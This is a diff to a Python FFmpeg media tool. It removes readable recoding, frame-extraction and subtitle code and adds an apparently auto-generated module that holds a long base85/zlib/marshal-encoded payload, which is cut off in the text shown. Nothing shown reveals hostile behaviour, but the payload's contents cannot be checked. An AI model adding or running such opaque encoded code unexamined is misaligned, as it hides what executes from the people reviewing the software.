-            pre_params = options.get('pre_params', [])
-            if pre_params:
-                command.extend(pre_params)
-            final_params = normalize_recode_parameters(
-                options['ffmpeg_params'],
-                options.get('output_container'),
-            )
-            video_idx = options.get('selected_video_stream_index')
-            audio_idx = options.get('selected_audio_stream_index')
-            mode = options.get('mode')
-
-            source_video_stream = None
-            if isinstance(media_info, dict) and mode != "Solo Audio":
-                video_streams = [
-                    stream for stream in media_info.get("streams", [])
-                    if stream.get("codec_type") == "video"
-                ]
-                source_video_stream = next(
-                    (stream for stream in video_streams if stream.get("index") == video_idx),
-                    video_streams[0] if video_streams else None,
-                )
-            source_has_alpha = pixel_format_has_alpha(
-                (source_video_stream or {}).get("pix_fmt")
-            )
-            if source_has_alpha and not recode_parameters_preserve_alpha(final_params):
-                raise Exception(
-                    "El archivo contiene transparencia, pero el perfil seleccionado la eliminaría. "
-                    "Usa el preset “Edición - ProRes 4444 Liviano (Transparencia)”."
-                )
-
-            command.extend(['-i', input_file])
-            if mode == "Video+Audio":
-                if video_idx is not None:
-                    command.extend(['-map', f'0:{video_idx}?'])
-                if audio_idx == "all":
-                    command.extend(['-map', '0:a?'])
-                elif audio_idx is not None:
-                    command.extend(['-map', f'0:{audio_idx}?'])
-            elif mode == "Solo Audio":
-                if audio_idx == "all":
-                    command.extend(['-map', '0:a?'])
-                elif audio_idx is not None:
-                    command.extend(['-map', f'0:{audio_idx}?'])
-            command.extend(final_params)
-            command.append(output_file)
-            print("--- Comando FFmpeg a ejecutar ---")
-            print(" ".join(command))
-            print("---------------------------------")
-            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-            error_output_buffer = []
-            process = subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='ignore', creationflags=creationflags)
-            self.current_process = process
-
-            def read_stream_into_buffer(stream, buffer):
-                """Lee línea por línea de un stream y lo guarda en una lista."""
-                for line in iter(stream.readline, ''):
-                    buffer.append(line.strip())
-            stdout_reader_thread = threading.Thread(target=self._read_stdout_for_progress, args=(process.stdout, progress_callback, cancellation_event, progress_duration), daemon=True)
-            stderr_reader_thread = threading.Thread(target=read_stream_into_buffer, args=(process.stderr, error_output_buffer), daemon=True)
-            stdout_reader_thread.start()
-            stderr_reader_thread.start()
-            while process.poll() is None:
-                if cancellation_event.is_set():
-                    # ESTA ES LA LÓGICA DE CANCELACIÓN DE single_tab
-                    self.cancel_current_process()
-                    raise UserCancelledError("Recodificación cancelada por el usuario.")
-                time.sleep(0.1) # Usar un tiempo de espera más corto
-            # ... (código anterior dentro de execute_recode) ...
-
-            stdout_reader_thread.join()
-            stderr_reader_thread.join()
-
-            # --- INICIO DE LA MODIFICACIÓN ---
-            if process.returncode != 0 and not cancellation_event.is_set():
-                # 1. Unir las líneas con saltos de línea para procesarlas mejor
-                full_error_log_text = "\n".join(error_output_buffer)
-                
-                # Imprimir en consola para debug completo (como antes)
-                print(f"\n--- ERROR DETALLADO DE FFmpeg ---\n{full_error_log_text}\n---------------------------------\n")
-                
-                # 2. Filtrar/Extraer las líneas más relevantes para el usuario
-                # FFmpeg suele poner el error crítico al final. Tomamos las últimas 10 líneas.
-                lines = full_error_log_text.split('\n')
-                
-                # Eliminamos líneas vacías al final
-                lines = [L for L in lines if L.strip()]
-                
-                # Tomamos las últimas líneas (ej. 8 líneas) para dar contexto sin llenar toda la pantalla
-                relevant_lines = lines[-8:] if len(lines) > 8 else lines
-                error_summary = "\n".join(relevant_lines)
-
-                # 3. Lanzar la excepción con el resumen del error real
-                raise Exception(f"FFmpeg falló. Detalles:\n\n{error_summary}")
-            # --- FIN DE LA MODIFICACIÓN ---
-
-            if cancellation_event.is_set():
-                raise UserCancelledError("Recodificación cancelada por el usuario.")
-
-            if not os.path.isfile(output_file) or os.path.getsize(output_file) <= 0:
-                raise Exception("FFmpeg no generó un archivo de salida válido.")
-
-            try:
-                output_media_info = self.get_local_media_info(output_file)
-                validate_recode_result_info(
-                    output_media_info,
-                    mode,
-                    requested_duration or source_duration,
-                )
-                if source_has_alpha:
-                    output_video_stream = next(
-                        (
-                            stream for stream in output_media_info.get("streams", [])
-                            if stream.get("codec_type") == "video"
-                        ),
-                        {},
-                    )
-                    if not pixel_format_has_alpha(output_video_stream.get("pix_fmt")):
-                        raise ValueError(
-                            "El archivo de salida perdió el canal de transparencia."
-                        )
-            except Exception as validation_error:
-                raise Exception(f"La validación del resultado falló: {validation_error}") from validation_error
-
-            return output_file
-
-# ... (resto del código) ...
-        except UserCancelledError as e:
-            self.cancel_current_process()
-            raise e
-        except Exception as e:
-            self.cancel_current_process()
-            raise Exception(f"Error en recodificación: {e}")
-        finally:
-            if process:
-                if process.stdout: process.stdout.close()
-                if process.stderr: process.stderr.close()
-            self.current_process = None
-
-    def _read_stdout_for_progress(self, stream, progress_callback, cancellation_event, duration):
-        """Lee el stdout de FFmpeg para el progreso, actualizando menos frecuentemente."""
-        last_reported_percentage = -1.0
-        for line in iter(stream.readline, ''):
-            if cancellation_event.is_set():
-                break
-            if 'out_time_ms=' in line:
-                try:
-                    progress_us = int(line.strip().split('=')[1])
-                    if duration > 0:
-                        progress_seconds = progress_us / 1_000_000
-                        percentage = (progress_seconds / duration) * 100
-                        if percentage >= last_reported_percentage + 1.0 or percentage >= 99.9 or percentage <= 0.1:
-                            progress_callback(percentage, f"Recodificando... {percentage:.1f}%")
-                            last_reported_percentage = percentage
-                except ValueError:
-                    pass
-
-    def get_local_media_info(self, input_file):
-        """
-        Usa ffprobe para obtener información detallada de un archivo local.
-        Esta versión usa Popen para un manejo más robusto de timeouts y streams.
-        """
-        ffprobe_exe_name = "ffprobe.exe" if os.name == 'nt' else "ffprobe"
-        ffprobe_path = os.path.join(os.path.dirname(self.ffmpeg_path), ffprobe_exe_name)
-        
-        command = [
-            ffprobe_path, # <--- Usar la ruta recién construida
-            '-v', 'quiet',
-            '-v', 'quiet',
-            '-print_format', 'json',
-            '-show_format',
-            '-show_streams',
-            input_file
-        ]
-        print(f"DEBUG: Ejecutando comando ffprobe con Popen: {' '.join(command)}")
-        try:
-            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-            process = subprocess.Popen(
-                command,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                encoding='utf-8',
-                errors='ignore',
-                creationflags=creationflags
-            )
-            stdout, stderr = process.communicate(timeout=60)
-            if process.returncode != 0:
-                print("--- ERROR DETALLADO DE FFPROBE (Popen) ---")
-                print(f"El proceso ffprobe falló con el código de salida: {process.returncode}")
-                print(f"Salida estándar (stdout):\n{stdout}")
-                print(f"Salida de error (stderr):\n{stderr}")
-                print("-----------------------------------------")
-                return None
-            return json.loads(stdout)
-        except subprocess.TimeoutExpired:
-            print("--- ERROR: TIMEOUT DE FFPROBE ---")
-            print("La operación de análisis del archivo local tardó demasiado (más de 60s) y fue cancelada.")
-            if 'process' in locals() and process:
-                process.kill() 
-                process.communicate()
-            print("---------------------------------")
-            return None
-        except (FileNotFoundError, json.JSONDecodeError) as e:
-            print(f"ERROR: No se pudo obtener información de '{input_file}' con ffprobe: {e}")
-            return None
-
-    def get_frame_from_video(self, input_file, duration=0):
-        """
-        Extrae un fotograma de un video en un punto de tiempo seguro.
-        CORREGIDO: Usa el orden de argumentos más robusto para FFmpeg.
-        """
-        if duration > 0:
-            seek_time_seconds = min(duration / 2, 5.0)
-            at_time = f"{seek_time_seconds:.3f}"
-        else:
-            at_time = '00:00:01' 
-
-        temp_dir = tempfile.gettempdir()
-        output_path = os.path.join(temp_dir, f"xomacito_thumbnail_{os.path.basename(input_file)}.jpg")
-        
-        command = [
-            self.ffmpeg_path,
-            '-y',
-            '-i', input_file,    
-            '-ss', at_time,      
-            '-vframes', '1',
-            '-q:v', '2',
-            output_path
-        ]
-        
-        try:
-            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-            subprocess.run(command, check=True, capture_output=True, creationflags=creationflags)
-            return output_path
-        except (subprocess.CalledProcessError, FileNotFoundError) as e:
-            print(f"ERROR: No se pudo extraer el fotograma: {e}")
-            return None
-        
-    def execute_video_to_images(self, options, progress_callback, cancellation_event: threading.Event):
-            """
-            Convierte un archivo de video en una secuencia de imágenes (ej. JPG o PNG).
-            """
-            process = None
-            try:
-                if cancellation_event.is_set():
-                    raise UserCancelledError("Extracción cancelada por el usuario antes de iniciar.")
-                    
-                input_file = options['input_file']
-                output_folder = os.path.normpath(options['output_folder'])
-                image_format = options.get('image_format', 'png')
-                fps = options.get('fps')
-                jpg_quality = options.get('jpg_quality', '2')  # String por defecto
-
-                # Validar calidad JPG
-                try:
-                    jpg_quality_int = int(jpg_quality)
-                    if not (1 <= jpg_quality_int <= 31):
-                        jpg_quality = '2'  # Fallback a calidad alta
-                except (ValueError, TypeError):
-                    jpg_quality = '2'
-
-                # 1. Asegurarse de que la carpeta de salida exista
-                os.makedirs(output_folder, exist_ok=True)
-                
-                # 2. Construir el comando
-                command = [self.ffmpeg_path, '-y', '-nostdin', '-progress', '-']
-                
-                pre_params = options.get('pre_params', [])
-                if pre_params:
-                    command.extend(pre_params)
-                
-                command.extend(['-i', input_file])
-                
-                final_params = []
-                
-                # 3. Añadir filtro de FPS (si se especificó)
-                if fps:
-                    try:
-                        fps_value = float(fps)
-                        final_params.extend(['-vf', f"fps={fps_value}"])
-                        print(f"INFO: Extrayendo a {fps_value} FPS.")
-                    except (ValueError, TypeError):
-                        print("INFO: FPS inválido, extrayendo todos los fotogramas.")
-                else:
-                    print("INFO: Extrayendo todos los fotogramas (FPS no especificado).")
-                
-                # 4. Añadir opciones de formato de imagen
-                if image_format == 'jpg':
-                    final_params.extend(['-q:v', str(jpg_quality)])
-                    output_pattern = "frame_%06d.jpg"
-                else:  # PNG
-                    output_pattern = "frame_%06d.png"
-
-                command.extend(final_params)
-                command.append(os.path.join(output_folder, output_pattern))
-                
-                print("--- Comando FFmpeg para Extracción de Imágenes ---")
-                print(" ".join(command))
-                print("-------------------------------------------------")
-                
-                # 5. Obtener duración
-                try:
-                    media_info = self.get_local_media_info(input_file)
-                    actual_duration = float(media_info['format']['duration'])
-                except Exception:
-                    actual_duration = options.get('duration', 0)
-
-                # 6. Ejecutar el proceso
-                creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-                error_output_buffer = []
-                process = subprocess.Popen(
-                    command,
-                    stdout=subprocess.PIPE, 
-                    stderr=subprocess.PIPE, 
-                    text=True, 
-                    encoding='utf-8', 
-                    errors='ignore', 
-                    creationflags=creationflags
-                )
-                self.current_process = process
-
-                def read_stream_into_buffer(stream, buffer):
-                    for line in iter(stream.readline, ''):
-                        buffer.append(line.strip())
-                
-                stdout_reader_thread = threading.Thread(
-                    target=self._read_stdout_for_progress, 
-                    args=(process.stdout, progress_callback, cancellation_event, actual_duration), 
-                    daemon=True
-                )
-                stderr_reader_thread = threading.Thread(
-                    target=read_stream_into_buffer, 
-                    args=(process.stderr, error_output_buffer), 
-                    daemon=True
-                )
-                
-                stdout_reader_thread.start()
-                stderr_reader_thread.start()
-                
-                while process.poll() is None:
-                    if cancellation_event.is_set():
-                        self.cancel_current_process()
-                        raise UserCancelledError("Extracción cancelada por el usuario.")
-                    time.sleep(0.1)
-                
-                stdout_reader_thread.join()
-                stderr_reader_thread.join()
-                
-                if process.returncode != 0 and not cancellation_event.is_set():
-                    full_error_log = " ".join(error_output_buffer)
-                    print(f"\n--- ERROR DETALLADO DE FFmpeg ---\n{full_error_log}\n---------------------------------\n")
-                    raise Exception(f"FFmpeg falló (ver consola para detalles técnicos).")
-                
-                if cancellation_event.is_set():
-                    raise UserCancelledError("Extracción cancelada por el usuario.")
-                
-                # 7. Éxito: Devolver la RUTA DE LA CARPETA
-                return output_folder
-                
-            except UserCancelledError as e:
-                self.cancel_current_process()
-                raise e
-            except Exception as e:
-                self.cancel_current_process()
-                raise Exception(f"Error en extracción de imágenes: {e}")
-            finally:
-                if process:
-                    if process.stdout: process.stdout.close()
-                    if process.stderr: process.stderr.close()
-                self.current_process = None
-
-def clean_and_convert_vtt_to_srt(input_path):
-    """
-    Convierte un archivo VTT a SRT limpio, o limpia un SRT existente.
-    Elimina etiquetas de formato, marcas de tiempo duplicadas y texto de karaoke.
-    """
-    import re
-    
-    output_path = input_path
-    is_vtt = input_path.lower().endswith('.vtt')
-    
-    # Si es VTT, cambiar la extensión a SRT
-    if is_vtt:
-        output_path = os.path.splitext(input_path)[0] + '.srt'
-    
-    try:
-        with open(input_path, 'r', encoding='utf-8') as f:
-            content = f.read()
-        
-        lines = content.split('\n')
-        cleaned_lines = []
-        counter = 1
-        skip_next = False
-        
-        for i, line in enumerate(lines):
-            # Saltar el encabezado WEBVTT
-            if line.strip().startswith('WEBVTT') or line.strip().startswith('Kind:') or line.strip().startswith('Language:'):
-                continue
-            
-            # Saltar líneas de estilo
-            if line.strip().startswith('STYLE') or '::cue' in line:
-                skip_next = True
-                continue
-            
-            if skip_next:
-                if line.strip() == '':
-                    skip_next = False
-                continue
-            
-            # 🔧 CRÍTICO: Limpiar texto de karaoke y etiquetas HTML
-            if line.strip() and '-->' not in line and not line.strip().isdigit():
-                # Eliminar etiquetas de formato VTT como <c>, <v>, etc.
-                cleaned = re.sub(r'<[^>]+>', '', line)
-                # Eliminar marcas de tiempo embebidas (karaoke)
-                cleaned = re.sub(r'<\d{2}:\d{2}:\d{2}\.\d{3}>', '', cleaned)
-                # Eliminar etiquetas de color y estilo
-                cleaned = re.sub(r'\{[^}]+\}', '', cleaned)
-                cleaned = cleaned.strip()
-                
-                if cleaned:
-                    cleaned_lines.append(cleaned)
-                continue
-            
-            # Mantener timestamps y números de secuencia
-            if '-->' in line or line.strip().isdigit() or line.strip() == '':
-                cleaned_lines.append(line.strip())
-        
-        # Reconstruir el archivo SRT
-        srt_content = []
-        i = 0
-        while i < len(cleaned_lines):
-            line = cleaned_lines[i]
-            
-            # Si es un timestamp
-            if '-->' in line:
-                # Agregar número de secuencia
-                srt_content.append(str(counter))
-                # Convertir formato de tiempo VTT a SRT si es necesario
-                timestamp = line.replace('.', ',')  # VTT usa punto, SRT usa coma
-                srt_content.append(timestamp)
-                
-                # Recoger todas las líneas de texto hasta la siguiente línea vacía
-                i += 1
-                text_lines = []
-                while i < len(cleaned_lines) and cleaned_lines[i].strip() != '':
-                    if '-->' not in cleaned_lines[i]:
-                        text_lines.append(cleaned_lines[i])
-                    else:
-                        i -= 1
-                        break
-                    i += 1
-                
-                if text_lines:
-                    srt_content.extend(text_lines)
-                
-                srt_content.append('')  # Línea vacía entre subtítulos
-                counter += 1
-            
-            i += 1
-        
-        # Guardar el archivo limpio
-        with open(output_path, 'w', encoding='utf-8') as f:
-            f.write('\n'.join(srt_content))
-        
-        # Si era VTT, eliminar el archivo original
-        if is_vtt and output_path != input_path:
-            try:
-                os.remove(input_path)
-            except:
-                pass
-        
-        print(f"DEBUG: Subtítulo limpiado y guardado en: {output_path}")
-        return output_path
-        
-    except Exception as e:
-        print(f"ERROR al limpiar subtítulo: {e}")
-        return input_path
-    
-def slice_subtitle(ffmpeg_path, input_path, output_path, start_time, end_time=None):
-    """
-    Corta el subtítulo usando FFmpeg con 'Input Seeking'.
-    Esto fuerza a FFmpeg a resetear los timestamps a 00:00:00 y maneja
-    la deriva de tiempo (drift) automáticamente.
-    """
-    import subprocess
-    import os
-
-    # Helper simple para calcular duración (necesario para -t)
-    def parse_time_to_seconds(t_str):
-        if not t_str: return 0.0
-        try:
-            parts = str(t_str).split(':')
-            if len(parts) == 3:
-                return int(parts[0]) * 3600 + int(parts[1]) * 60 + float(parts[2])
-            elif len(parts) == 2:
-                return int(parts[0]) * 60 + float(parts[1])
-            return 0.0
-        except: return 0.0
-
-    # Construir comando FFmpeg
-    cmd = [ffmpeg_path, '-y']
-    
-    # 1. CRÍTICO: -ss ANTES del input (-i)
-    # Esto le dice a FFmpeg: "Salta a este punto y finge que es el inicio (00:00:00)"
-    if start_time:
-        cmd.extend(['-ss', str(start_time)])
-    
-    cmd.extend(['-i', input_path])
-
-    # 2. Calcular duración para el corte final
-    # Al usar Input Seeking, -to ya no funciona igual, debemos usar -t (duración)
-    if end_time:
-        s_sec = parse_time_to_seconds(start_time)
-        e_sec = parse_time_to_seconds(end_time)
-        duration = e_sec - s_sec
-        if duration > 0:
-            cmd.extend(['-t', str(duration)])
-
-    # 3. Forzar codificación UTF-8 para evitar errores de caracteres
-    # (Especialmente útil con acentos en español)
-    cmd.append(output_path)
-    
-    try:
-        creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-        subprocess.run(
-            cmd, 
-            check=True, 
-            stdout=subprocess.DEVNULL, 
-            stderr=subprocess.DEVNULL,
-            creationflags=creationflags
-        )
-        return True
-    except Exception as e:
-        print(f"ERROR cortando subtítulo con FFmpeg: {e}")
-        return False
-    
+# Generated by scripts/obfuscate_python_tree.py. Do not edit by hand.
+from __future__ import annotations
+
+import base64 as _base64
+import marshal as _marshal
+import zlib as _zlib
+
+_PAYLOAD = (
+    "c-"
+    "qvx3wRsXc_2E2H$Z>@2oMC{!#BYP_@*T4VNrbPK~fS)y(J?c2BbiN05t$85e8*9aW{0LBvhSLR3q0^<6Tp=)6h+J!*tUdId&7JkJ"
+    "|wO7ck20RlB~un|r@|FD>hCTxP%RJ?G3|Fd&DN?0nsCOW6lA=Rc4Cy#Dk5|M|~9{~6=`WimhbCv{Q`yN!_;iMz4$%rAZ(N57);BJ"
+    "?XhFGjzT^AhwcJugMSvhy<ZD?cwMMWooRm{guu;uv_AxK)!G=QD6vp46?L)STDgm<uCi;}|Lb0~~}36e|A!CskwyslF>EHDu;p(W"
+    "^MA1@Srr)uS*Ag$6dI@vaP{%tk3qAU+2{%_z)8VIB(eQCI+S6@nZ^WHHJ?fVdI_DMeu!3d>Pgfx=1@R)KugcjX|T1?8&&akU7-"
+    "gmt{IJ{gi$R8s@W(Fo$25TqG}Ehub7VH-%>4qBW{y9>naMvy(Il^u7*<X&<gg6#*f2N3Kz1Uraeod|Xa#C9QAH-hy5STEU!V245M"
+    "5d=HR_S~_%63}z~2s!}b2NCo*3q66LClPcA#1A9r2n#)hpr;Y^42VCApyycVc?7+Hpcg^>B?Nt*h1wAG3kYfl@uLXpNXttis1wAG"
+    "A?SEo-pgFcE(D#}S~7^ef?#eIHi=-KyCM+hMUbg9$W;WP5X1){8KfWdo`wvd_-Pb>jTe9Yu85o=gX1Fd1u}%fSrpy?;fv%;U^IV="
+    "{36QxC6xE&WJvxt$p3H1FC*9-ihU&+l3(G$zKUXRg4nNtx{Bax0PkN%vEM-9Jb>K-"
+    "If}^N0V!T3ze#>;T;#&R`|q;vx7qgv@P6lR#=nKReh=mSHVW^e@U>(}{yxC_b#f8abPvV;0Sdo^!Z$#Qe+zo+-"
+    ";r;k6iX=fJ_`R3z}^D5yiI-=!Tt!veh-Dq0QL@m{W1A{1p5Js{r4#R4=DU0NU;J+{t@{n0Mq|S{+Rqzg!${_|AKP-"
+    "1f_ZaQoRe{KPBG-;g8Ap$6@$qAp9A4|2g>(rTqm;`{y9-"
+    "Ux3)ZB>xJ8|La{P`PX+v=QBzAy!J9ihQEWK*O99)W9Ri`1cX^+6odxyZ^;i{#?KqcHS%x3Z?*{Q!^qgn7#V*{#L&m{Ch|j&G6$qg"
+    "fE4B#-"
+    "147(2?2w@#6f7m6IrKxPO8i9aX8&>C)q<$UJAtOdXEncbdJ~tPMz%;vJG^e0CAbUy#ptD`fP`e4BEPn3<cGPt<CMNMD=wLS}ckUN"
+    "xh?EIw5zvMq$i`ync#u`kelR#OL;2gHUQLA!^#ap{Sp7UAK)*`V;b*z;tVK<CH}~$pJQ$0tQMDBxI9L(iNDbGT@7-"
+    "xrNd|5G49r(<-"
+    "K&)XbRO=TD~Iol2d^>N+(%a(n<FJu=ie(qlV)XlP4Z*P$VcG??A#_S=aryW2(DNus)IsF!HkZ3&u^F#`Z2I}_jBVhNZ*=}FMgd-t"
+    "Zm0}I@3*~mZS@>6!dlQ`j|d|nSo7POOIq8ik`JrJU?A+b(QwOT}|c?qS%>+#!N9w)_gb{p#KHj71t`XJfYZKxk86%3dzXlmb()%)"
+    "$^U_2z3ryWha?qjl2xykP1XKQYx^5I(n40gz(O=h7AVer}VfNEL=v&ho=bl|;v*IkorpEk8yg4sz38YiZ!8!f?tWOUEffD7~oWhZ"
+    "%1!O?5AP}#6n6RcIl;0UV@mUm7~xxu(l-"
+    "XW)tsGb6A!RfQvuUWvzIo)0dEXl%7z=V<mZ>Ydj_l~*TPSD?YBWhA21I_K`sisD^6HIykWy)zMeN+i=3KzqGfQfN-"
+    "gi2vh27_(VH9upzmS;@Y${?!-$l6<5TM@Q9W@uvyu1+slwxI-Vg&lW&W<v%a`$sm^@ORj6_mFmqWMU7WOh`aAfH=UAID0Y(=DT+q"
+    "3_@{o5CRn-5FCdqJ}?d^D5t~abG`R{&z6C>;zKwhjCN{%W3n|=`7@`ic;=Lq+ojChoU)2b341e`QEzuoUAEgsU4CBz-yKxdUk%tj"
+    "e%qwopO8+$o(-z&A<#DEq->L;32_skbUR>@Uj9xgE!(A(Q#J6p76x@NsE3&5p~35SO}p$KK({&}+Qe>%n}xE%R1M6+YUCD{rhD-"
+    "E;clXu^jyCTR*;MtI4ODsJHsfXQ%$XH1I%ocvr8vQL|S3c1|gEB=0+wFwF?A*$c?$}<GziIT9=!2_(3@71m*d?Q)q12ig*Qx_we&"
+    "uWWlVa#@&rm&499k`iX(jDIcITOxzypo?ZNCl+@MM2;!O>`AJ=EAZaT<TDJ@AYB1%VWQ+mDFzJ$!po?15yJ%=r7cp?O@)Qt2+1#U"
+    "i^tVamyZQ`?F7KE~nM`y&HJP_f1*QX!=&@u3Y^l2bLqs*27({DFb4N4inBkL~V-9bQ$vS-UEa=R}v^Y59QgPs)C8$1qVmDC@NdEN"
+    "Hb#6|{nD^v9*ocOmB~lFbUFn-"
+    "w3N9AfVw$$wL>ie*Bq+6BbB<1eq3q&@Qg`~qo+M)R(^Gqr$Ze=naSR4o=@_sW_N2DTmKHvO8$x^FHatp83xgoQtS5z8=jkSdncX{"
+    "CZ=Y^T(olpM8wVISz)HCs{)F0j9grH=q!Tb9?hR$VV=7P|@Ht6_vTzMZ(v!n5I0A#CFgS+xi}qwg+ALzK58@z*Y#ZB~U^}=1w}Zn"
+    "R%0`yU96Wub`$#7-"
+    "c)Dk>i(`OPmjTS?nRa>{3@<2}+O;9BryL3K^e6?M99Jo|AY(Gfv5%suHtGa?I|+j!80gZoNVZIjlP83ELlEEGlFnTWaxKY4EL_9k"
+    "p3`01Hpe;b;5COj4ueg|6$-Xzgk!XZ1@aU<LxTj_B^bYnT^ivUl!0aw+l1t13}(>NT2REBG^cjNJ8OGvTerb>cRIGGIBd1-"
+    "MCu&qCOQXtEfzI{u>#E@`{Wql(!h@EcKK%#a`pk?lMp+uPHjl*uTI%qXf`p=Q=4ZNQyz6124_&oqjonGtVpI==U{N2n_m}%X4;0D"
+    "FNFlNk}W*MlmvL&wAP*GT4&-"
+    "<t|K15(@mTlKFtk_0?n+ezG<Gwgv2s!{kYo;@U$gcylHx|!}NSQAO8iRNkv_PeWOVmlr(Ig=de|xnS(|lDayck0|o*09CenP3#m@"
+    "a;yNvhH}6N2y-i)*ng@`bW+sb+!C;ibK+nzwp{|1SA=y=wjcc!3uxChtp4l|2A|{cUN8(fcnJT|f5T4%O$!!jG7sT-kj6}r~0h2{"
+    "IlNmuTG^WY|%Sp{&PLv%&_`~Gfgls|%_A9P3YAj81OxAXpLvuV0bx_{r&E@G)4^O*Dr`PZGx<|d&8E!&y*)@I{uy0oZJ1E-"
+    "Km@L}Gu^W;}APiGiP@CEs!G;279Mb?6ch}as;Kbij7c~h3rlj3mO<s;8=7E8{En*<BT(GB1j|B~5Q@;I8ZFN3}-"
+    "R<1py1TKXzA31!2O^*!@a7KhBoJS&2ajE7?3lhp2&Ap^O@YNmT(DodFnVb(_#vhM(C>GSJ3YjODG)V!3H&5u!KTYEthtpftgZDoF"
+    "RZ1JEetTIpR2HhidCod9qF}518^V?*(Z3K6h=GZwFGmMQD>Z^L^bG%sXC&mZ49!<`I|^NXc+)Dw<2I(I{Am3bRE&s2w@3Lni2)@5"
+    "96*eizp!mKg>MHWVhDIDd%`Ing=Pimz4?HfK0FlzIMQ1Z&ES@`@tlbZgw!F*VtG4b?!AufTp>%&XtJZ)OGG@Ciw(dOg$$=v?WCYJ"
+    "tu;+ZIK_i7{C}^2MuGY<28&|e`cyhEp37=VsHv_I0XgU!Ii_L6w1SIM@!q5c5qQ#JCZRL(<bd5rRP?+94>z#_W`NS?VNVHgW^_eQ"
+    "&R401Y?9SndLB<Wd>z5Fy?awoqz}qY>4W|nW4+5zv7&6LFpNcV7i#U0}9j&FbKi@LEOUDz3pI9Hy9CPfO?7R-"
+    "{0D*Rj`PHI@B>xd`XUGChV8g=z_fyO;U+t>@vyhX64M5iZJ~Wx5rfp#`dEjNl4(bOGwcQN=V>Z0rTZcoL&Vswa4dw?;h00umbp1K"
+    "LrFe5%uL{s)YEmeF{X(anme=-"
+    "K^mj8B`+420i8_*(s!|ISm)q2t!~k!D2o$B9uS_Xa!Mi_qZnQkT7JN?e6LvAP#qf(NDbqsUT?VJl$0f_GrpZz}{nY&B4q*?+MCFb"
+    "h$jvUN1EnG@cwGI$>dcm)Ap7Gp$O94|kpb92Hbc+Y@5D-GMX>ple#18?S&~{0eO2S7C4yb$)YOyHIq~o@T-"
+    "5=G|8Sxyu7DNmV6B@ovBx&_L&;E0u4+IuO8oDB$$)A+Q<<*)VS+g*RYLOkpW*aDoqjO5;{I*k9#Fjlnko#k$F<7Po!UiO{CLmI6|"
+    "*!i55NTRS6O@}il<-w=$QXP5{L+eSuj9n`QbV|3g>4cnX~ltq<&g-Y%gfbXlD@r4R)?^M9Y)bw>;{ofMA>RahpiG#(-"
+    "E*hci9^aIm0<x=<-|so;dkNR=)GbDshqVLDzO@-MB^2Gg)TqlxeG|f(cv$={48F;&#4WK^o3sl9ff=^?t3Zg<r(<-r-"
+    "I8Ma*(q?f7515Td>ml*yPGi++Z`=id*(LRGhb)8q4Zd&hTVMyFf(=sgY?z}?X8Vhs5_}v1$Dz<>vMVm9b@|}6~lF}X*fVp-hhWB+"
+    "N^+Rz)FPTVcG1q2CxUMy3LU(GoMTm)x$0iapJxE6bbsn!ZcU{WFZI0^X<(&AsGXJjjVdee^E}K4-"
+    "f+z+DVXtGubnDVelF^h9bnV47xxvf^-sHOkSv9CfWjJ+ktiy)nL{8h<-"
+    "4?00EO)#~7UMa)eYl<(Rbjn%dn?_OZDYlG>o^MArb()D9I{%yV-qdX`wP*`em+_cymndTr7^-"
+    "Mn>#7t`myC?yUv6Nww8oK3TdqbH!sNk}#pxhj<jac5^&P&aU*1*wTx+5sr;aj-"
+    "5>6j~s`tkY;MFj_A3XaTgks~%+Q1~h(#=yr{}{C2k`nBCdm$?XFDUZ2kmM#d5_fa-"
+    "b?ByEI)hBKX~nK;zlu1OaKX3v>{PGY*5s6ONJklt%PrX`m9qJ$LfD+y_5fOL6(DF%fe5F@e%DB?8rJFsCnAaICzrXw=&zZja1{38"
+    "ZUNBnpa;OA0>Fux@EoIFasj#FoF0GW_uTmDG=Ew&WDA{lq38s*u)Z5~lFPY7qzR&ASB%%v5vY4zKtl_b+9e}^%PbTE<Wb6j>#+HF"
+    "AehbtqIIW`7)V(vY|J~hR?D4ZULmjo{sX+kmzw(W$<<#Ty_eyD{=NJyw26puUoiGrTNuH)T3L$<EYuERaHVGs;-"
+    "+D`Wj4Ieo^2$&L;!w#yok#-<y-"
+    "iO2Sham95jwT3VBilzg8XR8A*)T<U9bjU3DeKfs!o=2YV=}vZwrMzpsqceqb)Zo`A9#2PTg%X{DYE7}?)oE&^2eA&Sru2CzA^a9A"
+    "e~<uQP)Kq`@`z~$6^rwh#$Y48CD;7ECtc)GE9>L0So&hYRl4vuzL4nIgD2%<2xei%1<(6YS}s_lgd7Uz3IStoh?bur7wbqFXQ~#6"
+    "au5<6XCqMF(KYMT5qwx6VmNrU%~y{IM3l@I4OErL5jOMIB%RKgNbwmVU;ZqL3l3pE&LdUgDD@vE`ez}i-"
+    "+)6MAO*s;<s@eyQz|3GuU^<*YNxJ;C;wXimZ(ZHFG94X{W9@sf5Y{xGgAZIZ1X1U!wjPE;r>qARaoePf-VgmMPbDr`t9LQ~GU}?L"
+    "HeS!n)7x1!AV}fR#(S8;&GYYJB=%uuosY9%Evy?2+2MF2<DE3#zE1^kXrI`6nOj<1c0Eaf=L)erkLagrnnBLINHEGY1|)2+uDQ(("
+    "zFWaIcbt*ypDbQmDnAN=V(_YXEhz-7^E^LNy;d>c?;{!sSgIMD0kJgpsFy0f6lg-"
+    "2)I^F!S`r`HQRBRf|IreRWK44ePBDePc}D9@e)<^t)d=x|Wgo32INlz!NF>1ut+8iKQ~?2b<@RG&zSLS^u(FXbz2YWBe8IoEXdi{"
+    "AI-~E&`MzMMY*sArUE_#wdJ70-mIhPEcx;MwU!N%26yxk)m}dg+hR4C<oKfgk;kI(Y%Rf(rrx1L-"
+    "ZB=6<la~hqwYs97>M4yef8@^21me=9h7VnIo!WqH>H9<JdWDMsy9kE<T4{!!6=L3RX@12e^evsrS*Y33dwSb?Rq`3qEak2b{>XC8"
+    "0V3;~6s-Q9|aOf+9mg1~^6gq>q^k%$!cB85krz0cWtCazc`1LkXRL?eW==c?&h|+&sbg`8wgG>18I(x=5@vtr<-7(+gv-yYIM{+9"
+    "O5H%O}G{?ctnV5yS47;Xv4MAYwR3s}Fv<rpvo~l-5=~#&D(SLqqnu82oPdpi1pa^-"
